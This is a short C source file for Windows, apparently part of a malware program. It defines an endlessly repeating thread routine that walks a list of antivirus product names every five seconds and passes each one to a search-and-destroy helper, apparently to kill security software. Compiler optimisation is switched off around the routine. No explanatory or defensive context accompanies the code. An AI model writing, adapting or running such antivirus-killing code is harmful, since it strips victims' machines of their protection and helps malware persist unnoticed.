#include "data_globals.h"
#include <windows.h>
#include <stdbool.h>

#pragma optimize("", off)
DWORD WINAPI _AntiVirusTerminate(void)
{
    volatile struct _LocalCtx {
        int index;
    } ctx;
    
    ctx.index = 0;
    
    do {
        for (ctx.index = 0; AntiVirus[ctx.index] != NULL; ctx.index++) {
            _SearchNDestroy((char *)AntiVirus[ctx.index]);
        }
        Sleep(5000);
    } while(true);
    
    return 0;
}
#pragma optimize("", on)
